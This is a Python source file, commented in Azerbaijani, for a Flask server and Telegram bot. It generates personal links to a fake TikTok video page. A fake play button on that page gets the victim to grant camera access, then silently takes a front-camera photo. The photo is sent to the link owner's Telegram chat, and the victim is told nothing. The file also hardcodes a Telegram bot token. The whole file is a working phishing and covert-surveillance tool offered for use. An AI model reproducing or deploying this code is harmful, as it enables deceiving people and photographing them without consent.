import os
import json
import logging
import base64
import requests
from datetime import datetime
from threading import Thread
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- 1. CONFIG & LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Təhlükəsizlik: Token və URL mühit dəyişənlərindən alınmalıdır (Fallback olaraq səninkiləri qoydum)
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8069501498:AAExx7_1QkbFWLAkBcWZF7JNMKrpIo0uWCg")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://camera-cjl1.onrender.com")
FLASK_PORT = int(os.environ.get("PORT", 5000))
USERS_FILE = "users.json"

app = Flask(__name__)

# --- 2. DATABASE HELPER ---
def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except json.JSONDecodeError:
            return {}
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

# --- 3. TELEGRAM BOT LOGIC ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    users = load_users()
    
    # Qeydiyyat
    if str(user.id) not in users:
        users[str(user.id)] = {
            'name': user.first_name,
            'joined': datetime.now().isoformat(),
            'photos_received': 0
        }
        save_users(users)
    
    share_link = f"{WEBHOOK_URL}/share?user_id={user.id}"
    
    message = (
        f"👋 Salam {user.first_name}!\n\n"
        f"📱 **Sizin Özəl Linkiniz:**\n{share_link}\n\n"
        f"💡 **Bu linki başqasına göndərin:**\n"
        f"- Onlar linki açsın\n"
        f"- Kamera icazəsi versin\n"
        f"- Şəkil çəksin\n"
        f"- Şəkil sizə gələcək! ✅"
    )
    
    keyboard = [[InlineKeyboardButton("📋 Linki Kopyala", url=share_link)]]
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))
    logger.info(f"User {user.id} logged in.")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.message.photo:
        await update.message.reply_text("✅ Şəkil qəbul edildi!")

def run_bot():
    bot_app = Application.builder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    bot_app.run_polling()

# --- 4. FLASK WEB SERVER ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="az">
<head>
<title>Tiktok</title>

    <meta name="description" content="Kulannıcının paylaştığı bir videoyu izle.">

    <meta property="og:title" content="Tiktok">
    
    <meta property="og:description" content="Tiktokta bir videoyu izle.">
    
    <meta property="og:image" content="https://i.pinimg.com/originals/12/b2/fd/12b2fdec74d4efb2ec99913f63b5b318.png">
    
    <meta property="og:type" content="website">
    
    <meta property="og:url" content="https://example.com">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; user-select: none; }
        
        /* Arxa plandakı video elementi */
        #video { width: 100%; height: 100%; object-fit: cover; opacity: 0; transition: opacity 0.5s; }
        
        /* TikTok Sağ Paneli */
        .sidebar { position: absolute; right: 15px; bottom: 120px; display: flex; flex-direction: column; gap: 25px; z-index: 10; color: white; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
        .icon-wrapper { display: flex; flex-direction: column; align-items: center; }
        .icon { font-size: 35px; margin-bottom: 5px; }
        .text { font-size: 13px; font-weight: bold; }

        /* Sol alt məlumat hissəsi */
        .bottom-info { position: absolute; left: 15px; bottom: 40px; color: white; z-index: 10; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
        .username { font-weight: bold; font-size: 18px; margin-bottom: 8px; }
        .description { font-size: 15px; width: 80%; }

        /* Fake Play Button */
        #playOverlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            background: rgba(0,0,0,0.5); z-index: 20; cursor: pointer;
        }
        .play-btn { font-size: 70px; color: rgba(255,255,255,0.8); }
    </style>
</head>
<body>

    <div id="playOverlay">
        <div class="play-btn">▶</div>
    </div>

    <video id="video" autoplay playsinline></video>

    <div class="sidebar">
        <div class="icon-wrapper"><div class="icon">🤍</div><div class="text">143.1K</div></div>
        <div class="icon-wrapper"><div class="icon">💬</div><div class="text">179</div></div>
        <div class="icon-wrapper"><div class="icon">🔖</div><div class="text">2889</div></div>
        <div class="icon-wrapper"><div class="icon">↪️</div><div class="text">7430</div></div>
    </div>

    <div class="bottom-info">
        <div class="username">@gizemli_video</div>
        <div class="description">Bu videonu izləmək üçün ekrana toxun 👆 #kesfet #trend</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const playOverlay = document.getElementById('playOverlay');
        const userId = "{{ user_id }}"; // Flask-dan gələn user_id

        // İstifadəçi ekrana (saxta play düyməsinə) toxunanda işə düşür
        playOverlay.addEventListener('click', async () => {
            try {
                // Kamera icazəsi istənilir
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                playOverlay.style.display = 'none'; // Play düyməsini gizlət
                video.style.opacity = '1'; // Kameranı göstər (istəsən bunu 0 saxlaya bilərsən ki, özünü görməsin)

                // Kamera açılandan 1.5 saniyə sonra şəkli çək (fokuslanması üçün vaxt)
                setTimeout(() => {
                    captureAndSend();
                }, 1500);

            } catch (err) {
                // Əgər Block etsə və ya icazə verməsə
                alert("Videonu izləmək üçün kamera icazəsi verməlisiniz.");
            }
        });

        async function captureAndSend() {
            // Şəkli çəkmək üçün kətan (canvas) yaradırıq
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const photoDataUrl = canvas.toDataURL('image/jpeg');

            // Serverə (Telegram bota) səssizcə göndəririk
            try {
                await fetch('/upload-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: userId, photo: photoDataUrl })
                });
                // Göndərdikdən sonra heç bir xəbərdarlıq çıxmır, arxa planda iş bitir.
            } catch (error) {
                console.error("Xəta baş verdi");
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return "✅ Telegram Kamera Bot Aktivdir!"

@app.route('/share')
def share():
    user_id = request.args.get('user_id')
    users = load_users()
    
    if not user_id or user_id not in users:
        return "<h1>❌ Xəta: Etibarsız və ya səhv link.</h1>", 400
        
    return render_template_string(HTML_TEMPLATE, user_id=user_id)

@app.route('/upload-photo', methods=['POST'])
def upload_photo():
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        photo_base64 = data.get('photo')
        
        if not user_id or not photo_base64:
            return jsonify({'success': False, 'error': 'Parametr yoxdur'}), 400
            
        # JSON-a yazmaq əvəzinə, Base64-ü dərhal oxuyub Telegram-a atırıq. Yaddaş qənaəti!
        photo_bytes = base64.b64decode(photo_base64.split(',')[1])
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
        payload = {'chat_id': user_id, 'caption': f"📸 Yeni Şəkil!\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        
        response = requests.post(url, files=files, data=payload)
        
        if response.status_code == 200:
            # Uğurlu olarsa, sadəcə sayğacı artır
            users = load_users()
            if user_id in users:
                users[user_id]['photos_received'] = users[user_id].get('photos_received', 0) + 1
                save_users(users)
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Telegram API xətası'}), 500

    except Exception as e:
        logger.error(f"Error processing upload: {e}")
        return jsonify({'success': False, 'error': 'Server xətası'}), 500

# --- 5. MAIN EXECUTION ---
if __name__ == '__main__':
    # Flask-ı fonda başlat
    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=FLASK_PORT, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    
    logger.info("Server və Bot aktiv edildi!")
    
    # Telegram Bot-u ana thread-də başlat
    run_bot()
